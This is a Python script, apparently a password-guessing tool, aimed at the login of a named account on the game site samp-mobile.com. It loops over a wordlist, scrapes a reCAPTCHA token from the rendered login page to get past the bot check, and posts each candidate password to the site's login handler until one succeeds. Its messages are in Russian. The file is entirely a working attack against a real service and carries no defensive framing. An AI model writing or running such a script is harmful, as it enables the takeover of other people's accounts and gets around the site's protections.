# -*- coding: utf-8 -*-
import requests
import requests_html
import json
import time


session = requests_html.HTMLSession()

settings = json.loads(open('settings.json').read())

userName = settings['nickname']
base = open(settings['files'][0]['path']).read().split()

for userPassword in base:
	while True:
		try:
			response = session.get('https://samp-mobile.com/account/')
			response.html.render()
			g_recaptcha_response = response.html.find('input')[2].attrs['value']
			break
		except:
			pass
	data = {
		"user_name" : userName,
		"user_password" : userPassword,
		"act" : "account_login",
		"g-recaptcha-response" : g_recaptcha_response
	}
	response = requests.post('https://samp-mobile.com/system/global_classes/Handler.php', data=data).json()
	status = response['status']
	if status == 'ok':
		print('Верный пароль: {}'.format(userPassword))
		input()
		exit()
	else:
		print('Текущий пароль: {}'.format(userPassword))